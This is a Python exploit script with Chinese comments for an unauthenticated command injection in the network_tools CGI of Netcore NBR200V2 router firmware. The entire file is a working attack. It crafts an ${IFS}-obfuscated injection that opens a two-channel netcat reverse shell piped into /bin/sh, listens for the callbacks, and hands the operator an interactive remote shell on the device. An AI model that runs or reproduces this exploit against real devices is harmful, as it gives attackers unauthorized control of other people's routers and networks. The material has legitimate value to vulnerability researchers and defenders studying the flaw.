#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# EXP: Netcore NBR200V2 V1.3.241127 未授权命令注入（/cgi-bin/network_tools eval 注入，鉴权前执行）
# 目标架构: mipsel (MIPS32r2 LE, LEDE 17.01) —— 固件 busybox nc 为简化版(仅 nc IP PORT)，
# 故采用双通道反弹: lport  = 攻击者 -> 目标 (命令输入)
#                    lport+1 = 目标 -> 攻击者 (回显输出)
# 用法: python exp_netcore_nbr200_network_tools_rce.py <target_ip> [target_port] [lhost] [lport]
#   例: python exp_netcore_nbr200_network_tools_rce.py 192.168.2.234 8080 192.168.2.128 4444
# 说明: target_port 为固件 uhttpd 端口(真机 80/443, 模拟环境 8080); lhost 为本机(接收 shell)IP

import socket
import sys
import threading
import time
import http.client

def usage():
    print(__doc__ if False else
          "Usage: python %s <target_ip> [target_port=80] [lhost] [lport=4444]" % sys.argv[0])
    sys.exit(1)

def main():
    if len(sys.argv) < 2:
        usage()
    target = sys.argv[1]
    tport = int(sys.argv[2]) if len(sys.argv) > 2 else 80
    lhost = sys.argv[3] if len(sys.argv) > 3 else "0.0.0.0"
    lport = int(sys.argv[4]) if len(sys.argv) > 4 else 4444

    # lhost 用于 payload 中回连；若填 0.0.0.0 需要用户明确，实际回连地址取本机出网 IP
    rhost = lhost
    if rhost == "0.0.0.0":
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect((target, tport))
            rhost = s.getsockname()[0]
        finally:
            s.close()
    print("[*] target = %s:%d  reverse to = %s:%d(cmd)/%d(out)" % (target, tport, rhost, lport, lport + 1))

    # 1) 双通道监听
    cmd_srv = socket.socket()
    cmd_srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    cmd_srv.bind(("0.0.0.0", lport))
    cmd_srv.listen(1)
    cmd_srv.settimeout(30)

    out_srv = socket.socket()
    out_srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    out_srv.bind(("0.0.0.0", lport + 1))
    out_srv.listen(1)
    out_srv.settimeout(30)

    # 2) 发送 exploit (注入命令在 CGI 鉴权前的 eval 阶段执行; CGI 会一直阻塞, 用线程发)
    #    payload 约束: 只能含一个 '='; 不能含 '&'(参数分隔符) / '#'(URL fragment) / 空格(用 ${IFS})
    inject = ("tail${IFS}-f${IFS}/dev/null|nc${IFS}%s${IFS}%d|/bin/sh|nc${IFS}%s${IFS}%d"
              % (rhost, lport, rhost, lport + 1))
    path = "/cgi-bin/network_tools?a=';%s;:'" % inject
    print("[*] exploit path: %s" % path)

    def fire():
        try:
            conn = http.client.HTTPConnection(target, tport, timeout=10)
            conn.putrequest("GET", path, skip_host=False, skip_accept_encoding=True)
            conn.endheaders()
            conn.getresponse().read()
        except Exception:
            pass  # CGI 阻塞/断开都正常, shell 通道才是关键

    threading.Thread(target=fire, daemon=True).start()
    print("[*] exploit sent, waiting for reverse connections ...")

    try:
        cmd_conn, ca = cmd_srv.accept()
        print("[+] cmd channel connected from %s:%d" % ca)
        out_conn, oa = out_srv.accept()
        print("[+] output channel connected from %s:%d" % oa)
    except socket.timeout:
        print("[-] reverse connection timeout (30s). 检查: 目标web端口/防火墙/lhost可达性")
        sys.exit(2)

    cmd_conn.settimeout(None)
    out_conn.settimeout(1.0)

    # 3) 初始化: stderr 并入 stdout(在 sh 内执行, 数据走 socket 不受 URL 限制), 然后打个标记
    cmd_conn.sendall(b"exec 2>&1\n")
    time.sleep(0.3)
    cmd_conn.sendall(b"id && echo SHELL_OK && pwd\n")

    def reader():
        buf = b""
        while True:
            try:
                data = out_conn.recv(4096)
                if not data:
                    sys.stdout.write("\n[-] output channel closed\n")
                    sys.stdout.flush()
                    return
                buf += data
                while b"\n" in buf:
                    line, buf = buf.split(b"\n", 1)
                    sys.stdout.write(line.decode(errors="replace") + "\n")
                    sys.stdout.flush()
            except socket.timeout:
                continue
            except OSError:
                return

    threading.Thread(target=reader, daemon=True).start()
    time.sleep(1.0)
    print("[*] interactive shell (exit/quit 退出):")

    # 4) REPL
    while True:
        try:
            line = input("")
        except (EOFError, KeyboardInterrupt):
            break
        if line.strip() in ("exit", "quit"):
            break
        try:
            cmd_conn.sendall(line.encode() + b"\n")
        except OSError:
            print("[-] cmd channel broken")
            break
        time.sleep(0.2)

    try:
        cmd_conn.sendall(b"exit\n")
        time.sleep(0.3)
    except OSError:
        pass
    cmd_conn.close()
    out_conn.close()
    cmd_srv.close()
    out_srv.close()
    print("[*] done")

if __name__ == "__main__":
    main()
